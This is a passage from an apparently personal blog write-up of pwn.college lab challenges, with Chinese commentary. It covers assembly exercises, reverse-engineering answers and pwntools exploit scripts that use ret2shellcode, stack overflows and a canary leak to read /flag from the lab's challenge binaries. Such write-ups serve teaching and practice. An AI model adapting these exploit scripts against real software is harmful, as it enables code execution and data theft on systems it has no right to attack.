class="hljs-string">&quot;yxsewuhi&quot;</span>));<br>    sleep(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒä¸Šï¼Œæ”¹ä¸ª <code>|</code> å°±è¡Œäº†</p><h1>Assembly Crash Course(6/23)</h1><h2 id="L1-v4"><a class="header-anchor" href="#L1-v4">Â¶</a>L1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;mov rdi,0x1337;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="L2-v4"><a class="header-anchor" href="#L2-v4">Â¶</a>L2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;add rdi,0x331337;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="L3-v3"><a class="header-anchor" href="#L3-v3">Â¶</a>L3</h2><p>mul çš„æ—¶å€™ rdx ä¼šè¢«å½±å“ï¼Œè¦å…ˆå¤‡ä»½ä¸€ä¸‹ =ã€‚=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;mov rax,rdi;mov r8,rdx;mul rsi;add rax,r8;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="L4-v3"><a class="header-anchor" href="#L4-v3">Â¶</a>L4</h2><p>div</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;mov rax,rdi;mov r8,rdx;div rsi;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="L5-v3"><a class="header-anchor" href="#L5-v3">Â¶</a>L5</h2><p>div é»˜è®¤æŠŠä½™æ•°å­˜åˆ° raxã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;mov rax,rdi;mov r8,rdx;div rsi;mov rax,rdx;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="L6-v3"><a class="header-anchor" href="#L6-v3">Â¶</a>L6</h2><p>ä¸‹æ ‡æ‘˜è‡ª <a href="https://stackoverflow.com/questions/20637569/assembly-registers-in-64-bit-architecture">Assembly registers in 64-bit architecture</a></p><table><thead><tr><th style="text-align:left">64-bit register</th><th style="text-align:left">Lower 32 bits</th><th style="text-align:left">Lower 16 bits</th><th style="text-align:left">Lower 8 bits</th></tr></thead><tbody><tr><td style="text-align:left">rax</td><td style="text-align:left">eax</td><td style="text-align:left">ax</td><td style="text-align:left">al</td></tr><tr><td style="text-align:left">rbx</td><td style="text-align:left">ebx</td><td style="text-align:left">bx</td><td style="text-align:left">bl</td></tr><tr><td style="text-align:left">rcx</td><td style="text-align:left">ecx</td><td style="text-align:left">cx</td><td style="text-align:left">cl</td></tr><tr><td style="text-align:left">rdx</td><td style="text-align:left">edx</td><td style="text-align:left">dx</td><td style="text-align:left">dl</td></tr><tr><td style="text-align:left">rsi</td><td style="text-align:left">esi</td><td style="text-align:left">si</td><td style="text-align:left">sil</td></tr><tr><td style="text-align:left">rdi</td><td style="text-align:left">edi</td><td style="text-align:left">di</td><td style="text-align:left">dil</td></tr><tr><td style="text-align:left">rbp</td><td style="text-align:left">ebp</td><td style="text-align:left">bp</td><td style="text-align:left">bpl</td></tr><tr><td style="text-align:left">rsp</td><td style="text-align:left">esp</td><td style="text-align:left">sp</td><td style="text-align:left">spl</td></tr><tr><td style="text-align:left">r8</td><td style="text-align:left">r8d</td><td style="text-align:left">r8w</td><td style="text-align:left">r8b (r8l)</td></tr><tr><td style="text-align:left">r9</td><td style="text-align:left">r9d</td><td style="text-align:left">r9w</td><td style="text-align:left">r9b (r9l)</td></tr><tr><td style="text-align:left">r10</td><td style="text-align:left">r10d</td><td style="text-align:left">r10w</td><td style="text-align:left">r10b (r10l)</td></tr><tr><td style="text-align:left">r11</td><td style="text-align:left">r11d</td><td style="text-align:left">r11w</td><td style="text-align:left">r11b (r11l)</td></tr><tr><td style="text-align:left">r12</td><td style="text-align:left">r12d</td><td style="text-align:left">r12w</td><td style="text-align:left">r12b (r12l)</td></tr><tr><td style="text-align:left">r13</td><td style="text-align:left">r13d</td><td style="text-align:left">r13w</td><td style="text-align:left">r13b (r13l)</td></tr><tr><td style="text-align:left">r14</td><td style="text-align:left">r14d</td><td style="text-align:left">r14w</td><td style="text-align:left">r14b (r14l)</td></tr><tr><td style="text-align:left">r15</td><td style="text-align:left">r15d</td><td style="text-align:left">r15w</td><td style="text-align:left">r15b (r15l)</td></tr></tbody></table><p>â€‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sea(<span class="hljs-string">&quot;Please give me your assembly in bytes&quot;</span>,asm(<span class="hljs-string">&#x27;mov al,dil;mov bx,si;&#x27;</span>))<br></code></pre></td></tr></table></figure><h1>Reverse Engineering</h1><h2 id="L1-v5"><a class="header-anchor" href="#L1-v5">Â¶</a>L1</h2><p>ida ç›´æ¥çœ‹ç§˜é’¥</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 <span class="hljs-type">EXPECTED_RESULT</span> db &#x27;pxnpm&#x27;,0            ; <span class="hljs-type">DATA</span> <span class="hljs-type">XREF</span>: main+1FDâ†‘o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010                                         ; main+249â†‘o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 _data           ends</span><br></code></pre></td></tr></table></figure><h2 id="L1-1-v2"><a class="header-anchor" href="#L1-1-v2">Â¶</a>L1.1</h2><p>å¥½åƒæ²¡å•¥åŒºåˆ«</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004008                                         ; .<span class="hljs-keyword">data</span>:off_4008â†“o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 aAbeqg          db &#x27;abeqg&#x27;,0            ; <span class="hljs-type">DATA</span> <span class="hljs-type">XREF</span>: main+138â†‘o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 _data           ends</span><br></code></pre></td></tr></table></figure><h2 id="L2-v5"><a class="header-anchor" href="#L2-v5">Â¶</a>L2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">v3 = BYTE1(buf);<br>BYTE1(buf) = HIBYTE(buf);<br>HIBYTE(buf) = v3;<br></code></pre></td></tr></table></figure><p>æŠŠç¬¬ä¸€ä¸ªå­—èŠ‚å’Œç¬¬ä¸‰ä¸ªå­—èŠ‚äº¤æ¢ã€‚</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 <span class="hljs-type">EXPECTED_RESULT</span> db &#x27;oglor&#x27;,0            ; <span class="hljs-type">DATA</span> <span class="hljs-type">XREF</span>: main+27Aâ†‘o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010                                         ; main+2C6â†‘o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>:0000000000004010 _data           ends</span><br></code></pre></td></tr></table></figure><p>å³ <code>oolgr</code></p><h2 id="L2-1-v2"><a class="header-anchor" href="#L2-1-v2">Â¶</a>L2.1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">5uLL</span>);<br>v3 = BYTE2(buf);<br>BYTE2(buf) = v5;<br>LOBYTE(v5) = v3;<br></code></pre></td></tr></table></figure><p>ä¸‰äº”å­—èŠ‚äº¤æ¢</p><h2 id="L3-v4"><a class="header-anchor" href="#L3-v4">Â¶</a>L3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">1</span>; ++j )<br>&#123;<br>  v3 = *((_BYTE *)&amp;buf + j);<br>  *((_BYTE *)&amp;buf + j) = *((_BYTE *)&amp;buf + <span class="hljs-number">4</span> - j);<br>  *((_BYTE *)&amp;buf + <span class="hljs-number">4</span> - j) = v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>äº¤æ¢ç¬¬ä¸€å­—èŠ‚å’Œæœ€åä¸€å­—èŠ‚ï¼Œç¬¬äºŒå­—èŠ‚å’Œå€’æ•°ç¬¬äºŒå­—èŠ‚</p><h2 id="L3-1"><a class="header-anchor" href="#L3-1">Â¶</a>L3.1</h2><p>åŒä¸Š</p><h2 id="L4-v4"><a class="header-anchor" href="#L4-v4">Â¶</a>L4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _BYTE unsigned char</span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> j,k;<br>    <span class="hljs-type">char</span> v3;<br>    <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;fkmty&quot;</span>;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">3</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span> - j; ++k )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;buf + k) &lt; *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) )<br>      &#123;<br>        v3 = *((_BYTE *)&amp;buf + k);<br>        *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>);<br>        *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) = v3;<br>      &#125;<br>    &#125;<br>  &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; buf &lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="L4-1"><a class="header-anchor" href="#L4-1">Â¶</a>L4.1</h2><p>åŒä¸Š</p><h2 id="L5-v4"><a class="header-anchor" href="#L5-v4">Â¶</a>L5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _BYTE unsigned char</span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> EXPECTED_RESULT[] =<br>        &#123;<br>                <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x00</span><br>        &#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>        *((_BYTE *)&amp;EXPECTED_RESULT + j) ^= <span class="hljs-number">0xA1</span>u;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; EXPECTED_RESULT &lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="L5-1"><a class="header-anchor" href="#L5-1">Â¶</a>L5.1</h2><p>åŒä¸Š</p><h2 id="L6-v4"><a class="header-anchor" href="#L6-v4">Â¶</a>L6</h2><h1>Exploitation Scenarios(22/22)âœ”</h1><p>æ™šä¸Šå›å®¶å·äº†ä¸ªæ¦œï¼Œçºªå¿µä¸€ä¸‹ 2333 (åæ¥å‘ç°æ˜¯ç¬¬äºŒæ‰¹æ”¾é¢˜ =ã€‚=)</p><p><img src="D:/Blog/n1ghtu/source/_posts/pwncollege.assets/image-20221114220755620.png" alt="image-20221114220755620"></p><h2 id="L1-L1-1-v2"><a class="header-anchor" href="#L1-L1-1-v2">Â¶</a>L1,L1.1</h2><p>ret2shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level1.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level1.1&#x27;</span>)<br><br><span class="hljs-comment"># sla(&quot;Reading 0x1000 bytes of shellcode from stdin.&quot;,asm(shellcraft.cat(&#x27;/flag&#x27;)))</span><br><span class="hljs-comment"># sla(&quot;Payload size: &quot;,&#x27;&#123;&#125;&#x27;.format(0x300))</span><br><span class="hljs-comment"># sla(&quot;Send your payload&quot;,p64(0x24BDC000)*0x40)</span><br><br>sla(<span class="hljs-string">&quot;Reading 0x1000 bytes of shellcode from stdin.&quot;</span>,asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>sla(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x300</span>))<br>sla(<span class="hljs-string">&quot;Send your payload&quot;</span>,p64(<span class="hljs-number">0x16F84000</span>)*<span class="hljs-number">0x40</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L2-L2-1-v2"><a class="header-anchor" href="#L2-L2-1-v2">Â¶</a>L2,L2.1</h2><p>æ²¡å¼€ aslrï¼Œå°±åœ¨è¿œç¨‹å¼€ä¸ª gdb è°ƒä¸€ä¸‹ï¼Œè¿˜æ˜¯ ret2shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level2.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level2.1&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br>sla(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x300</span>))<br>sla(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xe8</span>-<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x7fffffffd1f0</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L3-L3-1-v2"><a class="header-anchor" href="#L3-L3-1-v2">Â¶</a>L3,L3.1</h2><p>å¼€äº† canary çš„ ret2shellcodeï¼Œç”¨ printf leak å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span 